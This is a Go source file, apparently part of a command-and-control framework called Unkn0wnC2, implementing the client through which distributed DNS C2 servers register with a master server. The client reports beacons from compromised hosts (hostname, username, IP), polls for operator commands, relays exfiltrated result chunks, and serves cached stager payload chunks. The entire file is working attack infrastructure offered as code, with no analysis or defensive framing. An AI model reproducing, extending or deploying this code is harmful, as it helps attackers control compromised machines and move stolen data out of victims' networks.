// Package main implements the Master Server client for DNS C2 servers.
// This enables DNS servers to operate in distributed mode by reporting beacons,
// polling for tasks, and submitting results to the central Master Server.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"time"
)

// MasterClient handles communication with the Master Server
type MasterClient struct {
	masterURL    string
	serverID     string
	apiKey       string
	httpClient   *http.Client
	debug        bool
	lastCheckin  time.Time
	checkinMutex sync.RWMutex
}

// NewMasterClient creates a new master server client
func NewMasterClient(masterURL, serverID, apiKey string, tlsCACert string, tlsInsecure bool, debug bool) *MasterClient {
	// Configure HTTP client with TLS
	tlsConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: tlsInsecure,
	}

	// If CA cert provided, load it
	if tlsCACert != "" {
		caCert, err := os.ReadFile(tlsCACert)
		if err != nil {
			if debug {
				fmt.Printf("[MasterClient] Warning: Failed to load CA cert from %s: %v\n", tlsCACert, err)
			}
		} else {
			caCertPool := x509.NewCertPool()
			if caCertPool.AppendCertsFromPEM(caCert) {
				tlsConfig.RootCAs = caCertPool
				if debug {
					fmt.Printf("[MasterClient] Loaded CA certificate from %s\n", tlsCACert)
				}
			} else {
				if debug {
					fmt.Printf("[MasterClient] Warning: Failed to parse CA cert from %s\n", tlsCACert)
				}
			}
		}
	}

	tr := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	return &MasterClient{
		masterURL: masterURL,
		serverID:  serverID,
		apiKey:    apiKey,
		httpClient: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
		debug: debug,
	}
}

// Request/Response structures

type CheckinRequest struct {
	DNSServerID string                 `json:"dns_server_id"`
	APIKey      string                 `json:"api_key"`
	Status      string                 `json:"status"`
	Stats       map[string]interface{} `json:"stats"`
}

type CheckinResponse struct {
	Success       bool              `json:"success"`
	Message       string            `json:"message"`
	PendingCaches []StagerCacheTask `json:"pending_caches,omitempty"` // Stager chunks to cache
	DomainUpdates []string          `json:"domain_updates,omitempty"` // New domains to add
}

type StagerCacheTask struct {
	ClientBinaryID string   `json:"client_binary_id"`
	TotalChunks    int      `json:"total_chunks"`
	Chunks         []string `json:"chunks"` // All chunks for this binary
}

type BeaconReportRequest struct {
	DNSServerID string     `json:"dns_server_id"`
	APIKey      string     `json:"api_key"`
	Beacon      BeaconData `json:"beacon"`
}

type BeaconData struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	IPAddress string    `json:"ip_address"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
}

type ResultSubmitRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	TaskID      string `json:"task_id"`
	BeaconID    string `json:"beacon_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"`
}

type TaskResponse struct {
	ID       string `json:"id"`
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
	Status   string `json:"status"`
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message"`
	Data    interface{} `json:"data"`
}

// doRequest performs an HTTP request to the Master Server with retry logic
func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]byte, error) {
	url := mc.masterURL + endpoint

	// Marshal body once (reuse the JSON bytes for retries)
	var jsonData []byte
	var err error
	if body != nil {
		jsonData, err = json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal request: %w", err)
		}
	}

	// Retry logic with exponential backoff
	maxRetries := 3
	var lastErr error

	for attempt := 1; attempt <= maxRetries; attempt++ {
		// Create a new reader for each attempt (body can only be read once)
		var reqBody io.Reader
		if jsonData != nil {
			reqBody = bytes.NewBuffer(jsonData)
		}

		req, err := http.NewRequest(method, url, reqBody)
		if err != nil {
			return nil, fmt.Errorf("failed to create request: %w", err)
		}

		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Unkn0wnC2-DNSServer/0.3.0")
		req.Header.Set("X-DNS-Server-ID", mc.serverID)

		// Execute request
		resp, err := mc.httpClient.Do(req)
		if err != nil {
			lastErr = err
			if attempt < maxRetries {
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Request failed (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, err, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, err)
		}
		defer resp.Body.Close()

		// Read response body
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("failed to read response: %w", err)
		}

		// Check status code
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if attempt < maxRetries && (resp.StatusCode == 500 || resp.StatusCode == 503) {
				// Retry on server errors
				lastErr = fmt.Errorf("server error: %d - %s", resp.StatusCode, string(respBody))
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Server error (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, lastErr, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(respBody))
		}

		return respBody, nil
	}

	return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, lastErr)
}

// RegisterWithMaster registers this DNS server with the Master and retrieves active domain list
func (mc *MasterClient) RegisterWithMaster(domain, address string) ([]string, error) {
	req := struct {
		ServerID string `json:"server_id"`
		Domain   string `json:"domain"`
		Address  string `json:"address"`
		APIKey   string `json:"api_key"`
	}{
		ServerID: mc.serverID,
		Domain:   domain,
		Address:  address,
		APIKey:   mc.apiKey,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/register", req)
	if err != nil {
		return nil, fmt.Errorf("registration failed: %w", err)
	}

	var resp struct {
		Success bool   `json:"success"`
		Message string `json:"message"`
		Data    struct {
			ServerID string   `json:"server_id"`
			Domain   string   `json:"domain"`
			Domains  []string `json:"domains"`
		} `json:"data"`
	}

	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, fmt.Errorf("failed to parse registration response: %w", err)
	}

	if !resp.Success {
		return nil, fmt.Errorf("registration rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Registered with Master - %d active domains returned", len(resp.Data.Domains))
	}

	return resp.Data.Domains, nil
}

// Checkin sends a heartbeat to the Master Server
// Returns any pending stager cache tasks and domain updates
func (mc *MasterClient) Checkin(stats map[string]interface{}) ([]StagerCacheTask, []string, error) {
	req := CheckinRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Status:      "active",
		Stats:       stats,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/checkin", req)
	if err != nil {
		return nil, nil, fmt.Errorf("checkin failed: %w", err)
	}

	var resp CheckinResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, nil, fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if !resp.Success {
		return nil, nil, fmt.Errorf("checkin rejected: %s", resp.Message)
	}

	mc.checkinMutex.Lock()
	mc.lastCheckin = time.Now()
	mc.checkinMutex.Unlock()

	if mc.debug {
		if len(resp.PendingCaches) > 0 {
			logf("[Master Client] Checkin successful - %d pending cache tasks", len(resp.PendingCaches))
		} else if len(resp.DomainUpdates) > 0 {
			logf("[Master Client] Checkin successful - domain update received: %v", resp.DomainUpdates)
		} else {
			logf("[Master Client] Checkin successful")
		}
	}

	return resp.PendingCaches, resp.DomainUpdates, nil
}

// ReportBeacon reports a new or updated beacon to the Master Server
func (mc *MasterClient) ReportBeacon(beacon *Beacon) error {
	beaconData := BeaconData{
		ID:        beacon.ID,
		Hostname:  beacon.Hostname,
		Username:  beacon.Username,
		OS:        beacon.OS,
		Arch:      beacon.Arch,
		IPAddress: beacon.IPAddress,
		FirstSeen: beacon.FirstSeen,
		LastSeen:  beacon.LastSeen,
	}

	req := BeaconReportRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Beacon:      beaconData,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/beacon", req)
	if err != nil {
		return fmt.Errorf("beacon report failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse beacon response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("beacon report rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Beacon reported: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	return nil
}

// PollTasks fetches pending tasks from the Master Server for local beacons
func (mc *MasterClient) PollTasks() ([]TaskResponse, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/tasks?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("task poll failed: %w", err)
	}

	// Parse response as task array
	var tasks []TaskResponse
	if err := json.Unmarshal(respData, &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse tasks response: %w", err)
	}

	if mc.debug && len(tasks) > 0 {
		logf("[Master Client] Received %d task(s) from master", len(tasks))
	}

	return tasks, nil
}

// SubmitResult sends a task result (or result chunk) to the Master Server
// Returns (taskComplete, error) - taskComplete is true if this was the final chunk
func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalChunks int, data string) (bool, error) {
	req := ResultSubmitRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
		BeaconID:    beaconID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/result", req)
	if err != nil {
		return false, fmt.Errorf("result submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return false, fmt.Errorf("failed to parse result response: %w", err)
	}

	if !resp.Success {
		return false, fmt.Errorf("result submit rejected: %s", resp.Message)
	}

	// Check if task is complete (Master signals this after receiving all chunks)
	taskComplete := false
	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
		if complete, exists := dataMap["task_complete"]; exists {
			if completeBool, ok := complete.(bool); ok {
				taskComplete = completeBool
			}
		}
	}

	if mc.debug {
		if taskComplete {
			logf("[Master Client] Result submitted: Task %s COMPLETE (chunk %d/%d)", taskID, chunkIndex, totalChunks)
		} else {
			logf("[Master Client] Result submitted: Task %s, chunk %d/%d", taskID, chunkIndex, totalChunks)
		}
	}

	return taskComplete, nil
}

// MarkTaskComplete notifies the Master that the beacon has finished exfiltrating all chunks
// This is called when the DNS server receives the RESULT_COMPLETE message from the beacon
func (mc *MasterClient) MarkTaskComplete(taskID, beaconID string, totalChunks int) error {
	req := struct {
		DNSServerID string `json:"dns_server_id"`
		APIKey      string `json:"api_key"`
		TaskID      string `json:"task_id"`
		BeaconID    string `json:"beacon_id"`
		TotalChunks int    `json:"total_chunks"`
	}{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
		BeaconID:    beaconID,
		TotalChunks: totalChunks,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/result/complete", req)
	if err != nil {
		return fmt.Errorf("failed to mark task complete: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("request rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Task %s marked as COMPLETE (%d chunks)", taskID, totalChunks)
	}

	return nil
}

// MarkTaskDelivered notifies the Master that this DNS server delivered a task to a beacon
// This prevents other DNS servers from delivering the same task (Shadow Mesh coordination)
func (mc *MasterClient) MarkTaskDelivered(taskID string) error {
	req := struct {
		DNSServerID string `json:"dns_server_id"`
		APIKey      string `json:"api_key"`
		TaskID      string `json:"task_id"`
	}{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/tasks/delivered", req)
	if err != nil {
		return fmt.Errorf("failed to mark task as delivered: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("request rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Task %s marked as delivered", taskID)
	}

	return nil
}

// SyncBeacons fetches all active beacons from the Master Server
// This allows DNS servers to be aware of beacons registered on other servers
func (mc *MasterClient) SyncBeacons() ([]BeaconData, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/beacons?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("beacon sync failed: %w", err)
	}

	// Parse response as beacon array
	var beacons []BeaconData
	if err := json.Unmarshal(respData, &beacons); err != nil {
		return nil, fmt.Errorf("failed to parse beacons response: %w", err)
	}

	if mc.debug && len(beacons) > 0 {
		logf("[Master Client] Synced %d beacon(s) from master", len(beacons))
	}

	return beacons, nil
}

// SubmitProgress sends task progress update to the Master Server
func (mc *MasterClient) SubmitProgress(taskID, beaconID string, receivedChunks, totalChunks int, status string) error {
	req := map[string]interface{}{
		"dns_server_id":   mc.serverID,
		"api_key":         mc.apiKey,
		"task_id":         taskID,
		"beacon_id":       beaconID,
		"received_chunks": receivedChunks,
		"total_chunks":    totalChunks,
		"status":          status,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/progress", req)
	if err != nil {
		return fmt.Errorf("progress submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse progress response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("progress submit rejected: %s", resp.Message)
	}

	return nil
}

// ReportStagerContact reports that a stager made first contact with this DNS server (from cache)
// Returns the Master-assigned session ID for progress tracking
func (mc *MasterClient) ReportStagerContact(clientBinaryID, stagerIP, os, arch string) (string, error) {
	req := map[string]interface{}{
		"dns_server_id":    mc.serverID,
		"api_key":          mc.apiKey,
		"client_binary_id": clientBinaryID,
		"stager_ip":        stagerIP,
		"os":               os,
		"arch":             arch,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/contact", req)
	if err != nil {
		return "", fmt.Errorf("stager contact report failed: %w", err)
	}

	// Parse JSON response to extract session_id
	var resp map[string]interface{}
	if err := json.Unmarshal(respData, &resp); err != nil {
		// If we can't parse, just return empty session_id (backward compatibility)
		return "", nil
	}

	// Extract session_id from response data
	if data, ok := resp["data"].(map[string]interface{}); ok {
		if sessionID, ok := data["session_id"].(string); ok {
			return sessionID, nil
		}
	}

	// Fallback if Master doesn't return session_id (backward compatibility)
	return "", nil
}

// ReportStagerProgress reports chunk delivery progress for a stager session
func (mc *MasterClient) ReportStagerProgress(sessionID string, chunkIndex int, stagerIP string) error {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"session_id":    sessionID,
		"chunk_index":   chunkIndex,
		"stager_ip":     stagerIP,
	}

	// Fire-and-forget with no retries to reduce Master load
	// Use a short timeout for progress reports
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	jsonData, err := json.Marshal(req)
	if err != nil {
		return fmt.Errorf("failed to marshal progress request: %w", err)
	}

	url := fmt.Sprintf("%s/api/dns-server/stager/progress", mc.masterURL)
	httpReq, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create progress request: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := mc.httpClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("progress report failed: %w", err)
	}
	defer resp.Body.Close()

	// Don't even check the response - truly fire-and-forget
	return nil
}

// StartPeriodicCheckin starts a background goroutine for periodic check-ins
func (mc *MasterClient) StartPeriodicCheckin(interval time.Duration, statsFn func() map[string]interface{}, cacheHandler func([]StagerCacheTask), domainHandler func([]string)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			stats := statsFn()
			cacheTasks, domainUpdates, err := mc.Checkin(stats)
			if err != nil {
				if mc.debug {
					logf("[Master Client] Checkin error: %v", err)
				}
				continue
			}

			// Process any pending cache tasks
			if len(cacheTasks) > 0 && cacheHandler != nil {
				cacheHandler(cacheTasks)
			}

			// Process any domain updates
			if len(domainUpdates) > 0 && domainHandler != nil {
				domainHandler(domainUpdates)
			}
		}
	}()
}

// StartPeriodicTaskPoll starts a background goroutine for polling tasks
func (mc *MasterClient) StartPeriodicTaskPoll(interval time.Duration, taskHandler func([]TaskResponse)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			tasks, err := mc.PollTasks()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Task poll error: %v", err)
				}
				continue
			}

			if len(tasks) > 0 {
				taskHandler(tasks)
			}
		}
	}()
}

// StartPeriodicBeaconSync starts a background goroutine for syncing beacons from master
func (mc *MasterClient) StartPeriodicBeaconSync(interval time.Duration, beaconHandler func([]BeaconData)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			beacons, err := mc.SyncBeacons()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Beacon sync error: %v", err)
				}
				continue
			}

			if len(beacons) > 0 {
				beaconHandler(beacons)
			}
		}
	}()
}

// SyncTaskStatuses fetches completed/failed task statuses from Master
// This allows DNS servers to clear beacon.CurrentTask when tasks complete
func (mc *MasterClient) SyncTaskStatuses() ([]TaskResponse, error) {
	// Build query string with authentication - only get completed/failed tasks
	endpoint := fmt.Sprintf("/api/dns-server/task-statuses?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("task status sync failed: %w", err)
	}

	// Parse response as task array
	var tasks []TaskResponse
	if err := json.Unmarshal(respData, &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse task statuses response: %w", err)
	}

	if mc.debug && len(tasks) > 0 {
		logf("[Master Client] Synced %d task status update(s) from master", len(tasks))
	}

	return tasks, nil
}

// StartPeriodicTaskStatusSync starts a background goroutine for syncing completed task statuses
func (mc *MasterClient) StartPeriodicTaskStatusSync(interval time.Duration, statusHandler func([]TaskResponse)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			tasks, err := mc.SyncTaskStatuses()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Task status sync error: %v", err)
				}
				continue
			}

			if len(tasks) > 0 {
				statusHandler(tasks)
			}
		}
	}()
}

// GetLastCheckin returns the timestamp of the last successful check-in
func (mc *MasterClient) GetLastCheckin() time.Time {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()
	return mc.lastCheckin
}

// IsConnected checks if the master client has successfully checked in recently
func (mc *MasterClient) IsConnected() bool {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()

	// Consider connected if checked in within last 5 minutes
	return time.Since(mc.lastCheckin) < 5*time.Minute
}

// Stager session support

// StagerSessionInfo contains information about a stager deployment session
type StagerSessionInfo struct {
	SessionID   string   `json:"session_id"`
	TotalChunks int      `json:"total_chunks"`
	DNSDomains  []string `json:"dns_domains"`
	ChunkSize   int      `json:"chunk_size"`
}

// StagerChunkResponse contains chunk data from Master
type StagerChunkResponse struct {
	ChunkIndex int    `json:"chunk_index"`
	ChunkData  string `json:"chunk_data"`
	Success    bool   `json:"success"`
	Message    string `json:"message,omitempty"`
}

// InitStagerSession forwards a stager initialization request to Master
func (mc *MasterClient) InitStagerSession(stagerIP, os, arch string) (*StagerSessionInfo, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"stager_ip":     stagerIP,
		"os":            os,
		"arch":          arch,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/init", req)
	if err != nil {
		return nil, fmt.Errorf("stager init failed: %w", err)
	}

	var sessionInfo StagerSessionInfo
	if err := json.Unmarshal(respData, &sessionInfo); err != nil {
		return nil, fmt.Errorf("failed to parse stager init response: %w", err)
	}

	return &sessionInfo, nil
}

// GetStagerChunk requests a specific chunk from Master for a stager session
func (mc *MasterClient) GetStagerChunk(sessionID string, chunkIndex int, stagerIP string) (*StagerChunkResponse, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"session_id":    sessionID,
		"chunk_index":   chunkIndex,
		"stager_ip":     stagerIP,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/chunk", req)
	if err != nil {
		return nil, fmt.Errorf("stager chunk request failed: %w", err)
	}

	var chunkResp StagerChunkResponse
	if err := json.Unmarshal(respData, &chunkResp); err != nil {
		return nil, fmt.Errorf("failed to parse stager chunk response: %w", err)
	}

	if !chunkResp.Success {
		return nil, fmt.Errorf("chunk not available: %s", chunkResp.Message)
	}

	return &chunkResp, nil
}

// GetTaskStatus queries the Master for the current status of a task
// This allows DNS servers to check if tasks were completed on other servers
func (mc *MasterClient) GetTaskStatus(taskID string) (string, error) {
	endpoint := fmt.Sprintf("/api/tasks/%s/status?dns_server_id=%s&api_key=%s", taskID, mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return "", fmt.Errorf("task status query failed: %w", err)
	}

	var resp struct {
		Status string `json:"status"`
	}

	if err := json.Unmarshal(respData, &resp); err != nil {
		return "", fmt.Errorf("failed to parse task status response: %w", err)
	}

	return resp.Status, nil
}
